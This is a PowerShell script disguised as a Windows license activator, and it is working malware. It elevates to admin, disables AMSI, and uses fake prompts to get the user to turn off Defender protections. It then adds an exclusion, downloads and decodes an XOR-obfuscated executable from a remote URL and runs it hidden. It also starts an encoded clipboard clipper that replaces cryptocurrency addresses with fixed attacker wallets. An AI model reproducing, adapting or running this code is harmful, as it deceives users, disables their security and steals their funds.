# --- [RESEARCH STAGER v50.0: STEALTH RESTORATION] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. AGGRESSIVE ADMIN ELEVATION
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        $u = "System.Management.Automation.AmsiUtils"; $as = [Ref].Assembly.GetType($u)
        if ($as) { $f = $as.GetField("amsiInitFailed", "NonPublic,Static"); if ($f) { $f.SetValue($null, $true) } }
    } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Windows Digital License Activator"; $prep.Size = New-Object Drawing.Size(600,580)
    $prep.StartPosition = "CenterScreen"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,140)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > SYSTEM SCAN: COMPLETE`n > PRIVILEGES: ADMINISTRATOR`n > WARNING: WINDOWS DEFENDER IS ACTIVE`n > ACTION: MANUAL OVERRIDE REQUIRED"
    $prep.Controls.Add($console)

    $instr = New-Object Windows.Forms.Label
    $instr.Location = New-Object Drawing.Point(35,190); $instr.Size = New-Object Drawing.Size(520,80)
    $instr.ForeColor = [Drawing.Color]::DarkRed; $instr.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
    $instr.Text = "CRITICAL: You MUST turn OFF 'Real-time protection' AND 'Tamper Protection' in the next window. If you don't, the installation will be deleted immediately."
    $prep.Controls.Add($instr)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,280); $link.Size = New-Object Drawing.Size(500,50)
    $link.Text = "1. OPEN SECURITY SETTINGS (TURN ALL OFF)"; $link.BackColor = [Drawing.Color]::DarkBlue; $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,350); $check.Size = New-Object Drawing.Size(500,30); $check.Text = "2. I have turned OFF all protections and am ready."
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(200,420); $btn.Size = New-Object Drawing.Size(200,50); $btn.Text = "ACTIVATE NOW"; $btn.Enabled = $false
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Show-ActivatorUI {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Activation Progress"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    $label = New-Object Windows.Forms.Label; $label.Location = New-Object Drawing.Point(30,30); $label.Text = "Status: Initializing..."
    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,70); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($label); $form.Controls.Add($pb); $form.Show()

    $stages = @(@{p=30;t="Downloading License..."}, @{p=70;t="Action Required: Click YES on blue prompt..."}, @{p=100;t="Activation Complete!"})
    foreach ($s in $stages) {
        $label.Text = "Status: " + $s.t
        if ($pb.Value -eq 70) { Start-Sleep -Seconds 4 } 
        while ($pb.Value -lt $s.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 50 }
    }
    $form.Close()
    [Windows.Forms.MessageBox]::Show("Windows is now permanently activated.", "Success", 0, 64) | Out-Null
}

# --- EXECUTION (V34.0 CORE LOGIC) ---
Global-Initialize
Show-SecurityPrep

if ($global:proceed) {
    $BG_Logic = {
        try {
            # Use a more "hidden" public path to avoid ProgramData triggers
            $dir = "$env:PUBLIC\Libraries\SystemSync"
            if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
            Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

            $path = Join-Path $dir "WinSvcHost.exe"
            $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
            $data = [Convert]::FromBase64String($raw.Trim())
            for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
            [IO.File]::WriteAllBytes($path, $data)
            
            # TRIGGER THE BLUE BOX
            Start-Process $path -WindowStyle Hidden

            # CLIPPER ENGINE
            $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
            Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        } catch {}
    }
    Start-Job -ScriptBlock $BG_Logic | Out-Null
    Show-ActivatorUI
}
